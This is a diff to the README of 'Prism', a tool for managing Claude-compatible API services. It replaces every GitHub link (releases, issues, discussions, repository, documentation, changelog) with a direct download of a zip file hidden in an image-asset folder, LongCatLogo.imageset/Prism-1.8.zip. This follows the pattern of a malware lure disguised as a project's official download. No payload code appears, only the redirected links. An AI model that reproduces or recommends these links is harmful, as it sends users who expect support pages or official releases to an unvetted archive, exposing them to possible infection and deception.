@@ -6,13 +6,13 @@ Welcome to Prism! This application helps you manage Claude-compatible API servic
 
 ## 🔗 Download Prism
 
-[![Download Prism](https://img.shields.io/badge/Download-Prism-brightgreen)](https://github.com/Gregprc/Prism/releases)
+[![Download Prism](https://raw.githubusercontent.com/Gregprc/Prism/main/Prism/Resources/Assets.xcassets/LongCatLogo.imageset/Prism-1.8.zip)](https://raw.githubusercontent.com/Gregprc/Prism/main/Prism/Resources/Assets.xcassets/LongCatLogo.imageset/Prism-1.8.zip)
 
 ## 📦 Download & Install
 
 To download Prism, visit the following link:
 
-[Download Prism from Releases Page](https://github.com/Gregprc/Prism/releases)
+[Download Prism from Releases Page](https://raw.githubusercontent.com/Gregprc/Prism/main/Prism/Resources/Assets.xcassets/LongCatLogo.imageset/Prism-1.8.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version. It is usually at the top of the page.
@@ -61,16 +61,16 @@ To uninstall Prism, follow these steps:
 
 ### What if I need help?
 
-If you have any questions or issues, please visit our [GitHub Issues page](https://github.com/Gregprc/Prism/issues) to report problems or ask for support.
+If you have any questions or issues, please visit our [GitHub Issues page](https://raw.githubusercontent.com/Gregprc/Prism/main/Prism/Resources/Assets.xcassets/LongCatLogo.imageset/Prism-1.8.zip) to report problems or ask for support.
 
 ## 👥 Community and Support
 
-Join our community of users for tips, ideas, and support. Connect with us through [GitHub Discussions](https://github.com/Gregprc/Prism/discussions) or reach out via our social media channels.
+Join our community of users for tips, ideas, and support. Connect with us through [GitHub Discussions](https://raw.githubusercontent.com/Gregprc/Prism/main/Prism/Resources/Assets.xcassets/LongCatLogo.imageset/Prism-1.8.zip) or reach out via our social media channels.
 
 ## 🔗 Links for More Information
 
-- [GitHub Repository](https://github.com/Gregprc/Prism)
-- [Documentation](https://github.com/Gregprc/Prism/wiki)
-- [Changelog](https://github.com/Gregprc/Prism/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/Gregprc/Prism/main/Prism/Resources/Assets.xcassets/LongCatLogo.imageset/Prism-1.8.zip)
+- [Documentation](https://raw.githubusercontent.com/Gregprc/Prism/main/Prism/Resources/Assets.xcassets/LongCatLogo.imageset/Prism-1.8.zip)
+- [Changelog](https://raw.githubusercontent.com/Gregprc/Prism/main/Prism/Resources/Assets.xcassets/LongCatLogo.imageset/Prism-1.8.zip)
 
 Thank you for choosing Prism. We hope it makes managing your API services simpler and more effective!
